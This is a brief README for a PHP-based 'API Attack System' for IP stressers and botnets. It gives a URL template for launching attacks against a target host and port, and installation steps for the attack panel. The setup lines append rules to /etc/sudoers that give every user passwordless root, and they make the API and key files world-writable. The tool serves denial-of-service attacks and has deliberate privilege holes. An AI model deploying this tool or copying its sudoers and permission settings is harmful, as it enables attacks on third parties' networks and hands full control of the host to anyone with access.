# API
API Attack System for IP Stressers &amp; Botnets that runs on PHP5

URL: http://YOUR_SERVER_ADDRESS/api.php?key=YOUR_KEY&host=TARGET&port=TARGET_PORT&time=ATTACK_TIME&method=ATTACK_METHOD

Installation:

sudo apt-get -y install php5 php5-cgi lighttpd screen libpcap-dev

echo 'www-data ALL=(ALL) ALL' >> /etc/sudoers; echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers

sudo lighttpd-enable-mod fastcgi fastcgi-php; sudo service lighttpd force-reload

chmod 777 api.php keys.txt
